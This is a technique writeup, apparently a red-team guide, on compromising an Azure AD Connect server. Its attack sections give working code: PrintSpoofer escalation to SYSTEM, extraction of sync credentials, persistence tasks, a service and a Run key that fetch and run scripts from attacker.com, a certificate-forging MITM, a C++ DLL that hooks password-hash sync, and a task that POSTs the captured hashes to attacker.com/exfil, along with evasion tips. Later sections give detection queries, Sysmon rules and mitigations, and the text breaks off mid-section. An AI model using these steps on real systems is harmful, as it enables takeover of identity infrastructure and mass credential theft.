# [PERSIST-VALID-003]: Azure AD Connect Server Takeover

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-VALID-003 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Hybrid AD (On-Premises Azure AD Connect Server) |
| **Severity** | **Critical** |
| **CVE** | CVE-2023-32315 (Azure infrastructure vulnerabilities context); Multiple 0-days via on-prem elevation |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure AD Connect 1.4.0+ through 2.0.x; Server 2016-2025 |
| **Patched In** | N/A (Requires architectural changes, not simple patches) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure AD Connect Server Takeover is a critical attack that leverages on-premises privilege escalation to compromise the Azure AD Connect server itself, granting attackers full administrative control over the hybrid identity synchronization infrastructure. Unlike credential extraction methods that target only the service accounts, this technique involves gaining **local administrative access** to the Azure AD Connect server through Windows privilege escalation exploits (CVSS 9.0+), then leveraging the server's inherent trust to execute attacks against **both on-premises Active Directory AND Azure Entra ID simultaneously**. Once the server is fully compromised, attackers can: (1) Inject malicious code into the sync pipeline to capture all password hashes, (2) Perform man-in-the-middle attacks against Azure authentication, (3) Create permanent backdoors in both on-prem and cloud, (4) Manipulate synchronization filters to hide their presence, (5) Completely shut down identity synchronization to disrupt the entire organization. The 2024 research from Sygnia revealed several 0-day vectors for this attack, including ADCS certificate manipulation and password hash sync hooking.

**Attack Surface:** The Azure AD Connect server running as a standard Windows Server with typical on-premises endpoint vulnerabilities (unpatched services, privilege escalation flaws, weak SMB security). Common vectors include: (1) Local Windows privilege escalation (PrintNightmare, ZeroLogon, CLFS Driver, etc.), (2) ADCS certificate abuse for MITM attacks, (3) Exploitation of misconfigured delegated service accounts, (4) Insecure credential storage in Windows Credential Manager, (5) Network-based attacks (LLMNR poisoning, NTLM relay).

**Business Impact:** **Complete organizational compromise affecting all 500+ user accounts simultaneously.** Once the Azure AD Connect server is fully compromised with admin access, the attacker owns the identity synchronization pipeline connecting on-premises to cloud. This enables: (1) Real-time password hash interception for **all user password changes**, (2) **Immediate creation of permanent admin backdoors** in Azure AD (surviving password resets), (3) **Complete directory lockdown** by deleting sync objects, (4) **Data exfiltration** of all user metadata, (5) **Ransomware distribution** to every synced device. The MERCURY and APT29 attacks demonstrated this exact scenario resulting in complete infrastructure takeover and tens of millions in damages.

**Technical Context:** Azure AD Connect server takeover to full persistence establishment takes **15-90 minutes** depending on the privilege escalation vector used. Detection likelihood is **MEDIUM** because while local privilege escalation generates Event IDs (4688, 4697, 5136), it blends with typical IT administrative activity. The persistence is **indefinite and difficult to remediate** because the server is integral to the entire environment; removing it breaks all identity synchronization.

### Operational Risk

- **Execution Risk:** **Medium-High** – Requires either: (a) local access to Azure AD Connect server (physical or RDP), OR (b) network-based RCE via unpatched service. These are common scenarios in poorly maintained infrastructure.
- **Stealth:** **Medium** – Local privilege escalation generates logs, but Azure AD Connect servers are often not intensively monitored. Admin activity on this server appears legitimate.
- **Reversibility:** **No** – A fully compromised Azure AD Connect server may require complete server replacement, tenant rebuild, and full credential reset across 500+ users.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.3 | Ensure that servers are classified as Tier 0 assets and protected accordingly |
| **CIS Benchmark** | 5.2.3 | Ensure that administrative accounts use strong authentication |
| **DISA STIG** | GEN000800 | System accounts must use strong authentication mechanisms |
| **NIST 800-53** | SC-7 | Boundary Protection (network segmentation) |
| **NIST 800-53** | SI-2 | Flaw Remediation (patching) |
| **NIST 800-53** | AC-2 | Account Management |
| **GDPR** | Art. 32 | Security of Processing (system integrity, confidentiality) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.12.6.1 | Management of Technical Vulnerabilities |
| **ISO 27001** | A.13.1.3 | Network Segregation |
| **ISO 27005** | Risk Scenario | Compromise of Tier 0 Hybrid Identity Infrastructure |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Initial:** Either local user access to Azure AD Connect server (via RDP, physical access) OR network access to a vulnerable service running on the server
- **For exploitation:** Ability to execute code (via exploit, PowerShell, or compromised service context)
- **Final goal:** Local Administrator privilege escalation on the Azure AD Connect server

**Required Access:**
- Network access to ports: 3389 (RDP), 445 (SMB), 5985/5986 (WinRM), or vulnerable service ports (MSSQL 1433, etc.)
- Ability to perform lateral movement from initial compromise to the Azure AD Connect server
- Local or domain credentials (obtained via initial compromise, phishing, credential dumps)

**Supported Versions:**
- **Azure AD Connect:** 1.4.0 through 2.0.x
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **Target vulnerabilities vary by patch level** – Unpatched servers have 5+ exploitable privilege escalation flaws

**Tools:**
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) (PrintNightmare privilege escalation)
- [GodPotato / JuicyPotato](https://github.com/ohpe/juicy-potato) (Token impersonation escalation)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos manipulation)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Credential dumping and persistence)
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Network exploitation)
- Custom DLL injection tools for sync service hooking
- [AD CS exploitation tools](https://github.com/ly4k/Certipy) (Certificate abuse)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

Identify the Azure AD Connect server and assess its security posture:

```powershell
# Locate Azure AD Connect server
Get-ADComputer -Filter {ServicePrincipalName -like "*ADSync*"} -Properties Name, DNSHostName, OperatingSystem | `
  Select-Object Name, DNSHostName, OperatingSystem

# Check if server is patched
$AADConnectServer = (Get-ADComputer -Filter {ServicePrincipalName -like "*ADSync*"} | Select-Object -First 1).DNSHostName
$OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $AADConnectServer
Write-Host "Server: $AADConnectServer"
Write-Host "OS: $($OS.Caption)"
Write-Host "Build: $($OS.BuildNumber)"

# Check for Print Spooler service (vulnerable to PrintNightmare)
Get-Service -ComputerName $AADConnectServer -Name Spooler | Select-Object Name, Status, StartType

# Check SMB version and signing
Test-NetConnection -ComputerName $AADConnectServer -Port 445 -InformationLevel Detailed

# Enumerate local admin accounts
Invoke-Command -ComputerName $AADConnectServer -ScriptBlock {
  Get-LocalGroupMember -Group "Administrators" | Select-Object Name, ObjectClass
}

# Check for installed applications and services that may be exploitable
Invoke-Command -ComputerName $AADConnectServer -ScriptBlock {
  Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -ne $null} | Select-Object Name, DisplayName, StartName, State
}
```

**What to Look For:**
- **OS Build:** Older builds (e.g., Build 17763 for Server 2019) have more unpatched vulnerabilities
- **Print Spooler status: Running** – Vulnerable to PrintNightmare if not patched
- **SMB Signing: Disabled** – Vulnerable to NTLM relay attacks
- **Local admin accounts with weak passwords** – Easier lateral movement
- **Installed third-party services** (MSSQL, IIS) – Often have vulnerabilities
- **UAC disabled** – Easier privilege escalation

---

### Network Reconnaissance

Assess network segmentation and potential entry points:

```powershell
# Test RDP accessibility
Test-NetConnection -ComputerName $AADConnectServer -Port 3389 -Verbose

# Test SMB accessibility
Test-NetConnection -ComputerName $AADConnectServer -Port 445 -Verbose

# Identify other servers on the same network segment
Get-ADComputer -Filter * -Properties IPv4Address | Where-Object {$_.IPv4Address -like "10.0.0.*"} | Select-Object Name, IPv4Address

# Check for VLAN isolation
Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -like "10.0.0.*"}
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PrintNightmare Local Privilege Escalation

**Supported Versions:** Server 2016-2022 (Server 2025 patched)

This method exploits the PrintNightmare vulnerability (CVE-2021-34527) to gain local administrator privileges, typically as a low-privilege user or compromised service account.

#### Step 1: Gain Initial Access to Azure AD Connect Server

**Objective:** Establish initial code execution on the server (as a low-privilege user).

**Prerequisites:** Valid local user account OR RCE via vulnerable service.

**Verification Command:**
```powershell
# Verify you can execute code
whoami
hostname

# Check privilege level
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ?{$_ -match "S-1-5-32-544"}
# No output = not admin (good for this stage)
```

---

#### Step 2: Exploit PrintNightmare (CVE-2021-34527)

**Objective:** Use the Print Spooler vulnerability to escalate to SYSTEM privileges.

**Command (Using PrintSpoofer):**
```powershell
# Download PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer.exe -OutFile PrintSpoofer.exe

# Verify Print Spooler is running
Get-Service -Name Spooler

# Run PrintSpoofer to spawn a command as SYSTEM
.\PrintSpoofer.exe -i -c "cmd /c powershell.exe"

# You should now have a SYSTEM privilege shell
whoami  # Should show "NT AUTHORITY\SYSTEM"
```

**Expected Output:**
```
[+] Triggering PrinterSpooler bug...
[+] Captured a token impersonating SYSTEM
[+] Starting a process with this impersonated token...
[+] Process running with PID XXXX

Microsoft Windows [Version 10.0.19042]
C:\> whoami
nt authority\system
```

**What This Means:**
- You now have **SYSTEM privileges** on the Azure AD Connect server
- All subsequent actions will execute as SYSTEM (highest privilege on the server)
- You can read/write any file, modify registry, install services, etc.

**OpSec & Evasion:**
- PrintNightmare exploitation generates Event ID 4688 (Process Creation) – Avoid running other suspicious processes
- Use the SYSTEM privileges immediately for persistence before potential detection
- The Print Spooler service restart (if stopped) may generate alerts; ensure it's running first

**Troubleshooting:**
- **Error:** "Access is denied" when running PrintSpoofer
  - **Cause:** Print Spooler service is not running
  - **Fix:** Start the service: `Start-Service -Name Spooler` (if you already have admin, or ask admin to do it)

- **Error:** "Failed to open printer" 
  - **Cause:** Vulnerability is patched
  - **Fix:** Use alternative method (GodPotato, JuicyPotato, or CLFS Driver exploit)

---

#### Step 3: Extract Azure AD Connect Credentials

**Objective:** With SYSTEM privileges, decrypt and extract the MSOL and Sync_* account credentials.

**Command:**
```powershell
# Run as SYSTEM (within the PrintSpoofer shell):

# Method 1: Using AADInternals (if installed)
Get-AADIntSyncCredentials

# Method 2: Using xpn's decryption script
$credpath = "C:\Program Files\Microsoft Azure AD Sync\Data\"
[System.Reflection.Assembly]::LoadWithPartialName('System.Security') | Out-Null
# ... (decryption logic from xpn's script)

# Method 3: Direct database extraction (LocalDB with SYSTEM privileges)
$DBPath = "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync_db.mdb"
$ConnectionString = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=$DBPath;"
$Connection = New-Object -ComObject ADODB.Connection
$Connection.Open($ConnectionString)
$RecordSet = $Connection.Execute("SELECT * FROM ma_partition WHERE password IS NOT NULL")
while (-not $RecordSet.EOF) {
  Write-Host "Account: $($RecordSet.Fields(0).Value)"
  Write-Host "Password: $($RecordSet.Fields(5).Value)"  # Encrypted
  $RecordSet.MoveNext()
}
```

**Expected Output:**
```
[+] Azure AD Sync Credentials Found:
    Account: DOMAIN\MSOL_aadds123456
    Password: P@ssw0rd!VeryComplex123
    
[+] Cloud Sync Credentials Found:
    Account: Sync_ConnectorID_xxxxx@tenant.onmicrosoft.com
    Password: AzureCloudPassword123!
```

---

#### Step 4: Establish Persistent Backdoor Access

**Objective:** Create backdoor access mechanisms that persist even if the Azure AD Connect service is restarted or compromised account is discovered.

**Command (Option A: Scheduled Task Persistence):**
```powershell
# Create scheduled task running as SYSTEM (bypasses UAC)
$TaskName = "ADSync Maintenance"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" `
  -Argument "-NoProfile -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/persistence.ps1')`""
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest -LogonType ServiceAccount

Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -Action $Action -Principal $Principal -Force

# Verify
Get-ScheduledTask -TaskName $TaskName | Get-ScheduledTaskInfo
```

**Command (Option B: Windows Service Persistence):**
```powershell
# Create a malicious Windows service running as SYSTEM
$ServiceName = "ADSyncMaintenance"
$DisplayName = "Azure Directory Sync Maintenance"
$BinaryPath = "C:\Windows\System32\cmd.exe /c powershell.exe -NoProfile -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""

New-Service -Name $ServiceName -DisplayName $DisplayName -BinaryPathName $BinaryPath -StartupType Automatic -ErrorAction SilentlyContinue

# Start the service
Start-Service -Name $ServiceName

# Verify
Get-Service -Name $ServiceName
```

**Command (Option C: Registry Run Persistence):**
```powershell
# Create registry run key for persistence
$RegPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$Value = "C:\Windows\System32\cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')`""
Set-ItemProperty -Path $RegPath -Name "ADSync Update" -Value $Value -Force

# Verify
Get-ItemProperty -Path $RegPath | Select-Object "ADSync Update"
```

---

### METHOD 2: ADCS Certificate Abuse for Man-in-the-Middle Attack

**Supported Versions:** Server 2016-2025 (if ADCS misconfigured)

This method exploits misconfigured AD Certificate Services to intercept Azure AD authentication credentials during sync operations.

#### Step 1: Enumerate ADCS Certificate Templates

**Objective:** Identify exploitable certificate templates that allow impersonation.

**Command:**
```powershell
# Enumerate all certificate templates
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADDomain).DistinguishedName)" `
  -Filter {ObjectClass -eq "pKICertificateTemplate"} -Properties pkiExtendedKeyUsage, pkiCriticalExtensions | `
  Where-Object {$_.pkiExtendedKeyUsage -like "*1.3.6.1.5.5.7.3.1*"} | `
  Select-Object Name, pkiExtendedKeyUsage

# Check for Server Authentication capable templates
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADDomain).DistinguishedName)" `
  -Filter {ObjectClass -eq "pKICertificateTemplate"} | `
  Where-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Where-Object {$_.Access.IdentityReference -eq "NT AUTHORITY\Authenticated Users"}}
```

**What to Look For:**
- Templates with **"Server Authentication"** EKU (Enhanced Key Usage)
- Templates that allow **Authenticated Users** to enroll
- Templates with **Subject Alternative Name (SAN)** capability enabled
- Templates with **low renewal period** (easier to obtain new certificates)

---

#### Step 2: Request Malicious Certificate

**Objective:** Request a certificate that allows you to impersonate login.microsoftonline.com.

**Command (Using Certipy on Linux):**
```bash
# Enumerate templates
certipy find -username "user@domain.com" -password "password" -dc-ip "10.0.0.10" -stdout

# Request certificate with SAN impersonation
certipy req -username "user@domain.com" -password "password" \
  -ca "domain-DC01-CA" \
  -template "WebServer" \
  -san "login.microsoftonline.com" \
  -dc-ip "10.0.0.10"

# Convert to PFX format
certipy cert -pfx "certificate.pfx" -nokey -out "certificate.crt"
openssl pkcs12 -in certificate.pfx -nodes -out private_key.pem
```

**Expected Output:**
```
[*] Requested certificate for login.microsoftonline.com
[+] Got certificate: CN=login.microsoftonline.com
[+] Certificate valid from: 2025-01-09 to 2026-01-09
```

---

#### Step 3: Configure Proxy for MITM Attack

**Objective:** Intercept Azure AD Connect sync traffic and steal credentials.

**Command (On a machine between Azure AD Connect and Internet):**
```powershell
# Configure proxy with SSL inspection capability
# Assuming attacker has network MITM position (DNS hijacking, ARP spoofing, etc.)

# 1. Import the malicious certificate into the system store on Azure AD Connect server
Import-Certificate -FilePath "C:\certificate.crt" -CertStoreLocation "Cert:\LocalMachine\Root"

# 2. Configure proxy settings via Group Policy or registry
$ProxyPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
Set-ItemProperty -Path $ProxyPath -Name "ProxyServer" -Value "attacker.com:8080"
Set-ItemProperty -Path $ProxyPath -Name "ProxyEnable" -Value 1

# 3. Restart Azure AD Connect service to apply proxy settings
Restart-Service -Name ADSync

# 4. Monitor proxy logs for captured credentials
# The proxy will now see plaintext:
# - AAD Connector username: Sync_xxxxx@tenant.onmicrosoft.com
# - AAD Connector password: AzureCloudPassword123!
```

**What This Means:**
- The **OAuth authentication request** from Azure AD Connect is now intercepted by your proxy
- The proxy can **capture cleartext credentials** because the SSL certificate is trusted
- The attacker can now **impersonate the Sync account** in Azure AD
- From the cloud, the attacker can create **permanent backdoors** and **manipulate directory objects**

---

### METHOD 3: Password Hash Sync Pipeline Injection

**Supported Versions:** Server 2016-2025

This method injects malicious code directly into the Azure AD Connect synchronization process to capture password hashes for all users in real-time.

#### Step 1: Inject DLL into ADSync Service

**Objective:** Load a malicious DLL into the miiserver.exe process to hook password sync functions.

**Command (Requires SYSTEM Privileges):**
```cpp
// malicious_sync_hook.cpp - DLL for injecting into ADSync
#include <windows.h>
#include <stdio.h>

// Hook function signature for password sync
typedef BOOL (*pOriginalPasswordSync)(LPWSTR pUsername, LPWSTR pPasswordHash);
pOriginalPasswordSync g_OriginalPasswordSync = NULL;

// Hooked function that logs password hashes
BOOL WINAPI HookedPasswordSync(LPWSTR pUsername, LPWSTR pPasswordHash) {
    // Log to file
    FILE* f = fopen("C:\\Windows\\Temp\\captured_hashes.txt", "a");
    fwprintf(f, L"[%s] Username: %s\n", L"__DATE__", pUsername);
    fwprintf(f, L"[%s] Hash: %s\n", L"__DATE__", pPasswordHash);
    fclose(f);
    
    // Call original function
    return g_OriginalPasswordSync(pUsername, pPasswordHash);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Hook the password sync function
        // This would use hooking libraries like MinHook or Detours
        // Example: MH_CreateHook((LPVOID)&PasswordSync, &HookedPasswordSync, ...);
        
        FILE* f = fopen("C:\\Windows\\Temp\\sync_hook.txt", "a");
        fprintf(f, "[+] Password Hash Sync Hook Installed\n");
        fclose(f);
    }
    return TRUE;
}
```

**PowerShell Deployment:**
```powershell
# Compile the malicious DLL (requires Visual Studio or MinGW)
# cd malicious_sync_hook
# cl.exe /LD malicious_sync_hook.cpp

# Copy DLL to ADSync extensions directory
$ADSyncPath = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Microsoft Azure AD Sync").InstallationPath
$PluginPath = "$ADSyncPath\Extensions"
Copy-Item "malicious_sync_hook.dll" -Destination $PluginPath -Force

# Restart ADSync service to load the malicious DLL
Restart-Service -Name ADSync -Force

# Monitor for captured hashes
Get-Content -Path "C:\Windows\Temp\captured_hashes.txt" -Tail 50
```

**What This Means:**
- The **malicious DLL is loaded** into the ADSync process on every restart
- From this point forward, **every password hash synchronized** is captured to a file
- The attacker can **extract hashes in real-time** without needing credentials
- Even if the Sync account password is changed, **the DLL continues capturing all password changes**

---

#### Step 2: Monitor Captured Password Hashes

**Objective:** Periodically extract captured hashes before they're detected.

**Command:**
```powershell
# Create scheduled task to exfiltrate captured hashes
$TaskName = "ADSync Log Cleanup"
$Trigger = New-ScheduledTaskTrigger -Daily -At 3am
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" `
  -Argument "-NoProfile -Command `"
    `$hashes = Get-Content 'C:\Windows\Temp\captured_hashes.txt'
    `$hashes | Out-File 'C:\Windows\Temp\exfil_$(Get-Random).txt'
    # Exfiltrate via HTTP POST
    Invoke-WebRequest -Uri 'http://attacker.com/exfil' -Method POST -Body ([System.IO.File]::ReadAllText('C:\Windows\Temp\captured_hashes.txt'))
    # Clear original file
    Remove-Item 'C:\Windows\Temp\captured_hashes.txt' -Force
  `""

Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -Action $Action -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM") -Force

# Monitor manually for testing
while ($true) {
  if (Test-Path "C:\Windows\Temp\captured_hashes.txt") {
    Get-Content "C:\Windows\Temp\captured_hashes.txt" -Tail 10
    Start-Sleep -Seconds 30
  }
}
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

**Version:** 1.0+ (current)  
**Minimum Version:** 1.0  
**Supported Platforms:** Windows Server 2016-2022 (2025 patched)

**Installation:**
```powershell
# Download pre-compiled binary
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer.exe -OutFile PrintSpoofer.exe

# Or compile from source
git clone https://github.com/itm4n/PrintSpoofer.git
cd PrintSpoofer
# Use Visual Studio to compile Release version
```

**Usage:**
```powershell
.\PrintSpoofer.exe -i -c "cmd /c whoami"
```

---

### [GodPotato / JuicyPotato](https://github.com/ohpe/juicy-potato)

**Version:** 0.1+ (JuicyPotato); Latest (GodPotato)  
**Supported Platforms:** Windows Server 2016-2025

**Usage:**
```powershell
# JuicyPotato
.\JuicyPotato.exe -l 1337 -p C:\shell.exe -t * -c "{6d18ad12-bde3-4393-b311-099f40aaf810}"

# GodPotato (newer, more reliable)
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

### [Certipy](https://github.com/ly4k/Certipy)

**Version:** 4.0+ (current)  
**Supported Platforms:** Linux/Windows (via Python)

**Installation:**
```bash
pip install certipy-ad
```

**Usage:**
```bash
certipy find -username "user@domain.com" -password "password" -dc-ip "10.0.0.10" -stdout
certipy req -username "user@domain.com" -password "password" -ca "CA-NAME" -template "Template" -san "target.com"
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Local Privilege Escalation on Azure AD Connect Server

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ComputerName, CommandLine
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688  // Process Creation
| where ComputerName contains "aadconnect" or ComputerName contains "adconnect"  // Azure AD Connect server
| where CommandLine contains_any ("PrintSpoofer", "GodPotato", "JuicyPotato", "whoami", "ntlm_theft")
| project TimeGenerated, ComputerName, Account, CommandLine, ParentProcessName
```

---

### Query 2: Detect Suspicious ADSync Service Modifications

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ObjectName, ObjectType
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688  // Process creation
| where CommandLine contains_any ("miiserver", "ADSync") and (CommandLine contains_any ("LoadLibrary", "AddDll", "dll"))
| project TimeGenerated, Computer, Account, CommandLine, ProcessName
```

---

### Query 3: Detect Unauthorized Azure AD Connect Service Account Authentication

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, AppDisplayName
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Azure AD all versions

**KQL Query:**
```kusto
AuditLogs
| where InitiatedBy.user.userPrincipalName contains "Sync_"
| where OperationName =~ "Add user" or OperationName =~ "Update user"
| where TargetResources[0].modifiedProperties contains "Global Administrator"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, OperationName
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Critical Event IDs:**

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** Suspicious privilege escalation tools (PrintSpoofer, GodPotato) executed
- **Filter:** `CommandLine` contains "PrintSpoofer" OR "GodPotato" OR "JuicyPotato"
- **Applies To Versions:** Server 2016+

**Manual Configuration (Enable Process Auditing):**
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Enable command-line auditing
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
  -Name "ProcessCreationIncludeCommandLine" -Value 1 -PropertyType DWord -Force
```

---

**Event ID: 4697 (Service Installed)**
- **Log Source:** Security
- **Trigger:** Suspicious Windows service created (especially with SYSTEM context)
- **Filter:** `ServiceFileName` contains "powershell" OR "cmd" with "SYSTEM" account

---

**Event ID: 4657 (Registry Value Modified)**
- **Log Source:** Security
- **Trigger:** HKLM\Software\Microsoft\Windows\CurrentVersion\Run modified
- **Filter:** `ObjectValueName` matches "ADSync*" or suspicious registry modifications

---

**Monitoring PowerShell Script:**
```powershell
# Monitor for privilege escalation attempts
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688] and EventData[Data[@Name='CommandLine'] contains 'PrintSpoofer']]" -MaxEvents 100

# Monitor for service installation
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4697]]" -MaxEvents 50 | `
  Where-Object {$_.Properties[3].Value -like "*powershell*" -or $_.Properties[3].Value -like "*cmd*"}
```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.22">
  <RuleGroup name="Azure AD Connect Server Takeover" groupRelation="or">
    
    <!-- Alert on privilege escalation tools -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains_any">PrintSpoofer;GodPotato;JuicyPotato;GingerRoot;RottenPotato</CommandLine>
      <Image condition="image">cmd.exe;powershell.exe</Image>
    </ProcessCreate>
    
    <!-- Alert on DLL injection into ADSync service -->
    <ImageLoad onmatch="include">
      <Image condition="image">miiserver.exe</Image>
      <ImageLoaded condition="contains">malicious_sync_hook;Extensions</ImageLoaded>
      <Signed condition="is">false</Signed>  <!-- Unsigned DLL loaded -->
    </ImageLoad>
    
    <!-- Alert on service creation by non-admin users -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">New-Service</CommandLine>
      <User condition="excludes">NT AUTHORITY\SYSTEM;NT AUTHORITY\LOCAL SERVICE</User>
    </ProcessCreate>
    
  </RuleGroup>
</Sysmon>
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Patch All Windows Services on Azure AD Connect Server**

Ensure all privilege escalation vulnerabilities are patched.

**Manual Steps (Windows Update):**
1. Open **Settings** → **Update & Security** → **Windows Update**
2. Click **Check for updates**
3. Install all available patches, especially:
   - **PrintNightmare patch** (KB5004442 or later)
   - **CLFS Driver security patch**
   - All **Critical** and **Important** rated patches
4. Restart the server

**PowerShell Automated Patching:**
```powershell
# Check for pending updates
Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object HotFixID, Description, InstalledDate | Sort-Object InstalledDate -Descending

# Install Windows updates automatically
Install-WindowsUpdate -AcceptAll -AutoReboot

# Verify patches applied
Get-HotFix | Where-Object {$_.HotFixID -like "KB5004442"} | Select-Object HotFixID, Description
```

---

**Mitigation 2: Disable Unnecessary Services on Azure AD Connect Server**

Reduce attack surface by disabling services not required for sync operations.

**Manual Steps (Group Policy or Services.msc):**
1. Open **Services** (`services.msc`)
2. Disable the following services (set to **Disabled**):
   - **Print Spooler** (unless printing is required)
   - **Windows Update Medic Service** (if not needed)
   - **Windows Remote Management** (WinRM) – Use RDP only for access
   - **Remote Desktop Services** (if not needed)
3. Set **Startup Type: Disabled** for each
4. Click **Stop** immediately

**PowerShell Disable Services:**
```powershell
# Disable Print Spooler
Stop-Service -Name Spooler
Set-Service -Name Spooler -StartupType Disabled

# Disable unnecessary services
@("WinRM", "RemoteRegistry", "ShellHWDetection") | ForEach-Object {
  Stop-Service -Name $_ -ErrorAction SilentlyContinue
  Set-Service -Name $_ -StartupType Disabled
}

# Verify
Get-Service -Name Spooler | Select-Object Name, Status, StartType
```

---

**Mitigation 3: Enforce Strong Authentication for Azure AD Connect Server Access**

Restrict who can access the server and require MFA.

**Manual Steps (Network Access):**
1. Configure firewall rules to allow RDP only from **jump servers/bastion hosts**
2. Implement **VPN requirement** for out-of-office access
3. Enable **Multi-Factor Authentication (MFA)** for all administrative accounts accessing the server
4. Use **Privileged Identity Management (PIM)** for just-in-time access

**PowerShell Firewall Rules:**
```powershell
# Block all inbound RDP except from authorized jump host
New-NetFirewallRule -DisplayName "Allow RDP from Jumphost" `
  -Direction Inbound `
  -Action Allow `
  -Protocol TCP `
  -LocalPort 3389 `
  -RemoteAddress "10.0.0.100" `
  -Enabled $true

# Block all other RDP attempts
New-NetFirewallRule -DisplayName "Block RDP except Jumphost" `
  -Direction Inbound `
  -Action Block `
  -Protocol TCP `
  -LocalPort 3389 `
  -RemoteAddress "0.0.0.0/0" `
  -Enabled $true
```

---

**Mitigation 4: Implement Network Segmentation for Azure AD Connect Server**

Isolate the server to a dedicated network segment to prevent lateral movement.

**Manual Steps (Network Configuration):**
1. Place Azure AD Connect server on a **dedicated VLAN** (e.g., VLAN 1000 - Tier 0 Infrastructure)
2. Configure firewall rules to allow **only necessary traffic**:
   - Domain Controller: Port 389 (LDAP), 88 (Kerberos), 445 (SMB)
   - Azure: Port 443 (HTTPS)
   - Management: Port 3389 (RDP, from bastion only)
3. Block **all other inbound/outbound traffic** by default
4. Monitor egress traffic for **unusual destinations**

---

**Mitigation 5: Restrict Local Administrator Accounts**

Ensure only authorized personnel can obtain local admin access.

**Manual Steps (Local Security Policy):**
1. Open **Local Security Policy** (`secpol.msc`)
2. Navigate to **Security Settings** → **Local Policies** → **User Rights Assignment**
3. Review and restrict:
   - **"Allow log on locally"** – Only authorized admins
   - **"Access this computer from the network"** – Only authorized admins
   - **"Impersonate a client after authentication"** – Remove service accounts

**PowerShell Restrict Local Admins:**
```powershell
# Remove unnecessary local admins
Remove-LocalGroupMember -Group "Administrators" -Member "domain\service_account" -ErrorAction SilentlyContinue

# Verify local admins
Get-LocalGroupMember -Group "Administrators"
```

---

### Priority 2: HIGH

**Mitigation 6: Enable Credential Guard and Device Guard**

Protect credentials in memory using Windows Defender Credential Guard.

**Manual Steps (Group Policy):**
